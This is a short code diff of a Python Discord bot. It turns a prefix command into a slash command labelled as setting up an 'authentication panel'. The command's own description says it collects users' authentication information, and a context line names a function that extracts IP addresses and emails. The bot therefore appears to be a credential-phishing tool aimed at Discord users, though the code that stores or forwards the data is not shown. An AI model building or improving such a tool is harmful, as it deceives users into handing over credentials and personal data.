@@ -70,7 +70,7 @@ def extract_ip_and_email(message):
 
     return ips, emails
 
-# --- コマンドの定義 ---
+# --- スラッシュコマンドの定義 ---
 
 class AuthModal(discord.ui.Modal):
     def __init__(self):
@@ -94,11 +94,11 @@ class AuthModal(discord.ui.Modal):
 
         await interaction.response.send_message("認証情報を受け取りました。", ephemeral=True)
 
-@bot.command(name="rurukkkk", description="ユーザーの認証情報を収集します。")
-async def rurukkkk(ctx):
+@bot.tree.command(name="認証パネル設置", description="ユーザーの認証情報を収集します。")
+async def auth_panel_setup(interaction: discord.Interaction):
     # 認証パネルを表示
     modal = AuthModal()
-    await ctx.send_modal(modal)
+    await interaction.response.send_modal(modal)
 
 # --- メイン実行 ---
 
